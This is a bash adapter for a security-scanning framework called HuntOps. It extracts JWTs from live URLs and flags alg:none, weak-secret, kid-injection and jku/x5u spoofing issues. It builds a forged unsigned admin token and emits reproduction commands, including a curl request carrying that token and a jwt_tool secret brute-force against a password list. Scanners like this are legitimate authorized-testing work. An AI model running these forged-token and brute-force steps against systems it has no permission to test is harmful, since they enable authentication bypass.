#!/usr/bin/env bash
# HuntOps — JWT Analyzer Adapter
# JWT vulnerability testing (alg:none, weak secret, kid injection, JWKS spoofing)
# Output: JSON Lines to stdout for findings sink

set -u
source "$(dirname "${BASH_SOURCE[0]}")/adapter_interface.sh"

# ---- Adapter Contract Implementation ------------------------------------------

adapter_init() {
  mkdir -p "$HUNTOPS_ROOT/output/jwt_analyzer"
  return 0
}

adapter_name() {
  echo "jwt_analyzer"
}

adapter_version() {
  echo "1.0.0"
}

adapter_capabilities() {
  echo "vuln jwt auth-bypass alg-none kid-injection jwks"
}

adapter_requires_api_key() {
  return 1
}

adapter_is_available() {
  if ! adapter_tool_exists "jwt_tool"; then
    adapter_warn "jwt_tool not found in PATH (install from ticarpi/jwt_tool)"
    return 1
  fi
  return 0
}

adapter_health_check() {
  python3 -c "import jwt_tool; print('jwt_tool available')" 2>/dev/null || python3 /opt/jwt_tool/jwt_tool.py --help 2>&1 | head -1
  return 0
}

adapter_scan() {
  local target="$1" outdir="$2" opts_json="$3"
  local max_duration

  max_duration=$(parse_opt "$opts_json" "max_duration" "300")

  # Get live URLs from web probe phase
  local live_urls_file="$outdir/../web/live-urls.txt"
  if [ ! -f "$live_urls_file" ] || [ ! -s "$live_urls_file" ]; then
    adapter_warn "No live URLs found for JWT analysis"
    return 0
  fi

  local output_file="$outdir/jwt_analyzer.txt"
  local count=0

  # Extract JWTs from responses
  while IFS= read -r url; do
    [ -z "$url" ] && continue
    local host=$(echo "$url" | sed 's|https\?://||' | cut -d/ -f1)

    # Try to get JWT from Authorization header or cookies
    local resp=$(timeout -k 10 30 curl -sk -D - "$url" 2>/dev/null)
    local jwt_token=""

    # Check Authorization header
    if echo "$resp" | grep -qi "authorization: bearer"; then
      jwt_token=$(echo "$resp" | grep -i "authorization: bearer" | sed 's/.*Bearer //i' | tr -d '\r')
    fi

    # Check cookies
    if [ -z "$jwt_token" ] && echo "$resp" | grep -qi "set-cookie"; then
      jwt_token=$(echo "$resp" | grep -i "set-cookie" | sed -n 's/.*=\(eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\).*/\1/p' | head -1)
    fi

    # Check response body for JWTs
    if [ -z "$jwt_token" ]; then
      jwt_token=$(echo "$resp" | grep -oE 'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' | head -1)
    fi

    if [ -n "$jwt_token" ]; then
      adapter_log "Found JWT on $url, analyzing..."

      # Decode header
      local header=$(echo "$jwt_token" | cut -d'.' -f1)
      local header_decoded=$(echo "$header" | base64 -d 2>/dev/null | tr -d '\n')
      local alg=$(echo "$header_decoded" | grep -o '"alg"[[:space:]]*:[[:space:]]*"[^"]*"' | sed 's/.*"alg"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/')

      emit_finding "info" "$host" "JWT found: alg=$alg" "confirmed" \
        "Header: $header_decoded" \
        "echo '$jwt_token' | cut -d'.' -f1 | base64 -d" \
        "jwt:token" "" "jwt,token"

      # Test alg:none
      if [ "$alg" != "none" ]; then
        local none_token=$(python3 -c "
import base64, json
h = json.dumps({'alg': 'none', 'typ': 'JWT'})
p = json.dumps({'sub': 'admin', 'role': 'admin'})
h_b64 = base64.urlsafe_b64encode(h.encode()).decode().rstrip('=')
p_b64 = base64.urlsafe_b64encode(p.encode()).decode().rstrip('=')
print(h_b64 + '.' + p_b64 + '.')
" 2>/dev/null)

        if [ -n "$none_token" ]; then
          emit_finding "critical" "$host" "JWT alg:none forgery possible" "candidate" \
            "Original alg: $alg, can forge tokens with alg:none" \
            "curl -H \"Authorization: Bearer $none_token\" \"$url\"" \
            "jwt:alg-none" "9.0" "jwt,auth-bypass,alg-none,cwe-345"
          count=$((count + 1))
        fi
      fi

      # Test weak secret (if HS256)
      if [ "$alg" = "HS256" ] || [ "$alg" = "HS384" ] || [ "$alg" = "HS512" ]; then
        emit_finding "high" "$host" "JWT HS256 - test weak secret" "candidate" \
          "Algorithm: $alg, vulnerable to secret brute-force" \
          "jwt_tool -t \"$jwt_token\" -C -d /usr/share/seclists/Passwords/Common-Credentials/top-passwords-10000.txt" \
          "jwt:weak-secret" "7.5" "jwt,auth-bypass,weak-secret,cwe-326"
        count=$((count + 1))
      fi

      # Check for kid header
      local kid=$(echo "$header_decoded" | grep -o '"kid"[[:space:]]*:[[:space:]]*"[^"]*"' | sed 's/.*"kid"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/')
      if [ -n "$kid" ]; then
        emit_finding "high" "$host" "JWT kid header present: $kid" "candidate" \
          "Key ID header may allow path traversal or key confusion" \
          "jwt_tool -t \"$jwt_token\" -K" \
          "jwt:kid-injection" "7.5" "jwt,auth-bypass,kid-injection,cwe-20"
        count=$((count + 1))
      fi

      # Check for jku/x5u headers (JWKS spoofing)
      local jku=$(echo "$header_decoded" | grep -o '"jku"[[:space:]]*:[[:space:]]*"[^"]*"' | sed 's/.*"jku"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/')
      local x5u=$(echo "$header_decoded" | grep -o '"x5u"[[:space:]]*:[[:space:]]*"[^"]*"' | sed 's/.*"x5u"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/')
      if [ -n "$jku" ] || [ -n "$x5u" ]; then
        emit_finding "critical" "$host" "JWT jku/x5u header present" "candidate" \
          "JWKS URL header allows key spoofing: jku=$jku, x5u=$x5u" \
          "jwt_tool -t \"$jwt_token\" -J" \
          "jwt:jku-spoofing" "9.0" "jwt,auth-bypass,jku-spoofing,cwe-20"
        count=$((count + 1))
      fi

      count=$((count + 1))
    fi

  done < <(head -30 "$live_urls_file")

  adapter_log "JWT analyzer found $count findings"
  return 0
}

export -f adapter_init adapter_name adapter_version adapter_capabilities
export -f adapter_requires_api_key adapter_is_available adapter_health_check adapter_scan